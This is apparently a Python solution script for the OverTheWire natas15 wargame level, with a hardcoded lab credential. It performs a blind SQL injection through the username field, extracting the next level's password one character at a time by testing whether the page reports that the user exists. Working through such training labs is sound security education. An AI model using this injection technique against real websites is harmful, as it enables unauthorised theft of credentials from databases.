import requests

password = ""

finished = False
while not finished:
    finished = True

    for i in range(128):
        if chr(i) in "%_":
            continue

        pwn_data = {
            "username": f'natas16" and password like binary "{password}{chr(i)}%',
        }

        r = requests.post(
            "http://natas15.natas.labs.overthewire.org/",
            auth=("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"),
            data=pwn_data,
        )

        if "exists" in r.content.decode():
            password += chr(i)
            print(password)
            finished = False
            break
